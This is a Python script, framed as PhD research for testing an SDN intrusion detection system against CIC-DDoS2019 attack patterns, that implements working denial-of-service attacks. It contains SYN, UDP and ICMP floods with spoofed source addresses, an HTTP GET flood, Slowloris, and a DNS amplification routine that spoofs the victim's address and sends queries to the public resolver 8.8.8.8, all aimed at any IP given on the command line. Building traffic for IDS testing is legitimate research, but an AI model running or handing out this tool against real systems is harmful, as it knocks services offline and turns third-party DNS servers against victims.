#!/usr/bin/env python3
"""
Advanced DDoS Attack Simulator for SDN-IDS Testing

Bu script, CIC-DDoS2019 veri setindeki saldırı türlerini simüle eder.
Gerçek DDoS saldırılarına benzer trafik kalıpları oluşturur.

Author: PhD Research - SDN Security
"""

import socket
import random
import time
import threading
import argparse
from scapy.all import *

class DDoSSimulator:
    """DDoS Attack Simulator for IDS Testing"""

    def __init__(self, target_ip, target_port=80):
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = False
        self.packet_count = 0

    def syn_flood(self, duration=60, rate=1000):
        """
        SYN Flood Attack
        CIC-DDoS2019: Syn attack pattern
        """
        print(f"[SYN FLOOD] Target: {self.target_ip}:{self.target_port}")
        print(f"[SYN FLOOD] Duration: {duration}s, Rate: {rate} pps")

        self.running = True
        start_time = time.time()

        while self.running and (time.time() - start_time) < duration:
            src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            src_port = random.randint(1024, 65535)

            ip = IP(src=src_ip, dst=self.target_ip)
            tcp = TCP(sport=src_port, dport=self.target_port, flags="S", seq=random.randint(1000, 9000))

            send(ip/tcp, verbose=0)
            self.packet_count += 1

            time.sleep(1/rate)

        print(f"[SYN FLOOD] Complete. Packets sent: {self.packet_count}")

    def udp_flood(self, duration=60, rate=1000):
        """
        UDP Flood Attack
        CIC-DDoS2019: UDP flood pattern
        """
        print(f"[UDP FLOOD] Target: {self.target_ip}:{self.target_port}")

        self.running = True
        start_time = time.time()

        while self.running and (time.time() - start_time) < duration:
            src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            src_port = random.randint(1024, 65535)

            ip = IP(src=src_ip, dst=self.target_ip)
            udp = UDP(sport=src_port, dport=self.target_port)
            payload = Raw(load=random._urandom(random.randint(64, 1400)))

            send(ip/udp/payload, verbose=0)
            self.packet_count += 1

            time.sleep(1/rate)

        print(f"[UDP FLOOD] Complete. Packets sent: {self.packet_count}")

    def icmp_flood(self, duration=60, rate=500):
        """
        ICMP Flood Attack (Ping of Death variant)
        """
        print(f"[ICMP FLOOD] Target: {self.target_ip}")

        self.running = True
        start_time = time.time()

        while self.running and (time.time() - start_time) < duration:
            src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

            ip = IP(src=src_ip, dst=self.target_ip)
            icmp = ICMP(type=8)  # Echo request
            payload = Raw(load=random._urandom(random.randint(64, 1400)))

            send(ip/icmp/payload, verbose=0)
            self.packet_count += 1

            time.sleep(1/rate)

        print(f"[ICMP FLOOD] Complete. Packets sent: {self.packet_count}")

    def http_flood(self, duration=60, connections=100):
        """
        HTTP GET Flood Attack
        CIC-DDoS2019: HTTP flood pattern
        """
        print(f"[HTTP FLOOD] Target: {self.target_ip}:{self.target_port}")

        def send_requests():
            while self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.target_ip, self.target_port))

                    request = f"GET /?{random.randint(1,99999)} HTTP/1.1\r\n"
                    request += f"Host: {self.target_ip}\r\n"
                    request += "User-Agent: Mozilla/5.0\r\n"
                    request += "Accept: */*\r\n\r\n"

                    sock.send(request.encode())
                    self.packet_count += 1
                    sock.close()
                except:
                    pass

        self.running = True
        threads = []

        for _ in range(connections):
            t = threading.Thread(target=send_requests)
            t.daemon = True
            t.start()
            threads.append(t)

        time.sleep(duration)
        self.running = False

        print(f"[HTTP FLOOD] Complete. Requests sent: {self.packet_count}")

    def slowloris(self, duration=60, connections=200):
        """
        Slowloris Attack - Slow HTTP DoS
        """
        print(f"[SLOWLORIS] Target: {self.target_ip}:{self.target_port}")

        sockets = []

        def create_socket():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target_ip, self.target_port))

                sock.send(f"GET /?{random.randint(1,99999)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {self.target_ip}\r\n".encode())
                sock.send("User-Agent: Mozilla/5.0\r\n".encode())
                sock.send("Accept-language: en-US,en\r\n".encode())

                return sock
            except:
                return None

        # Create initial sockets
        for _ in range(connections):
            sock = create_socket()
            if sock:
                sockets.append(sock)

        self.running = True
        start_time = time.time()

        while self.running and (time.time() - start_time) < duration:
            for sock in list(sockets):
                try:
                    sock.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
                    self.packet_count += 1
                except:
                    sockets.remove(sock)
                    new_sock = create_socket()
                    if new_sock:
                        sockets.append(new_sock)

            time.sleep(10)

        # Close all sockets
        for sock in sockets:
            try:
                sock.close()
            except:
                pass

        print(f"[SLOWLORIS] Complete. Keep-alive packets: {self.packet_count}")

    def dns_amplification(self, duration=60, rate=100):
        """
        DNS Amplification Attack Simulation
        """
        print(f"[DNS AMP] Target: {self.target_ip}")

        # DNS query for ANY record (amplification)
        dns_query = b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
        dns_query += b'\x06google\x03com\x00\x00\xff\x00\x01'

        self.running = True
        start_time = time.time()

        while self.running and (time.time() - start_time) < duration:
            # Spoof source IP as victim
            ip = IP(src=self.target_ip, dst="8.8.8.8")
            udp = UDP(sport=random.randint(1024, 65535), dport=53)

            send(ip/udp/Raw(load=dns_query), verbose=0)
            self.packet_count += 1

            time.sleep(1/rate)

        print(f"[DNS AMP] Complete. Packets sent: {self.packet_count}")

    def stop(self):
        """Stop the attack"""
        self.running = False


def main():
    parser = argparse.ArgumentParser(description='DDoS Attack Simulator for IDS Testing')
    parser.add_argument('target', help='Target IP address')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Attack duration (seconds)')
    parser.add_argument('-r', '--rate', type=int, default=1000, help='Packets per second')
    parser.add_argument('-a', '--attack', choices=[
        'syn', 'udp', 'icmp', 'http', 'slowloris', 'dns'
    ], default='syn', help='Attack type')

    args = parser.parse_args()

    simulator = DDoSSimulator(args.target, args.port)

    print("=" * 50)
    print("DDoS Attack Simulator - IDS Testing")
    print("=" * 50)
    print(f"Target: {args.target}:{args.port}")
    print(f"Attack: {args.attack}")
    print(f"Duration: {args.duration}s")
    print("=" * 50)
    print()

    try:
        if args.attack == 'syn':
            simulator.syn_flood(args.duration, args.rate)
        elif args.attack == 'udp':
            simulator.udp_flood(args.duration, args.rate)
        elif args.attack == 'icmp':
            simulator.icmp_flood(args.duration, args.rate)
        elif args.attack == 'http':
            simulator.http_flood(args.duration)
        elif args.attack == 'slowloris':
            simulator.slowloris(args.duration)
        elif args.attack == 'dns':
            simulator.dns_amplification(args.duration, args.rate)
    except KeyboardInterrupt:
        print("\n[STOPPED] Attack interrupted by user")
        simulator.stop()


if __name__ == '__main__':
    main()
